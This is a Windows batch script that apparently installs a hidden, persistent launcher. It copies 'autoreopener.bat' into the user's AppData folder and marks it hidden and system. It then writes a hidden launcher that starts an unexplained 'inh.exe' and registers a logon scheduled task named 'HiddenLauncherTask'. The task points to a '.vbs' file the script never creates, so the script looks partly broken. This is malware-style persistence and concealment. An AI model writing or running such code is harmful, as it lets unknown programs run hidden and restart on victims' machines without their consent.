@echo off
set "src=%TEMP%\autoreopener.bat"
set "appdata=%userprofile%\AppData"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%appdata%\autoreopener.bat" /Y
attrib +h +s "%appdata%\autoreopener.bat"

if %ERRORLEVEL%==0 (
    echo File copied successfully.
) else (
    echo Copy failed. Check permissions.
)


set "outfile=%appdata%\launcher.bat"

(
    echo @echo off
    echo start "" "%USERPROFILE%\AppData\inh.exe"
    echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
) > "%outfile%"

attrib +h +s "%appdata%\launcher.bat"

set "LAUNCHER=%APPDATA%\launcher.bat"
set "TASKNAME=HiddenLauncherTask"
if not exist "%LAUNCHER%" exit /b
schtasks /create /tn "%TASKNAME%" /tr "wscript.exe \"%LAUNCHER%.vbs\"" /sc onlogon /F


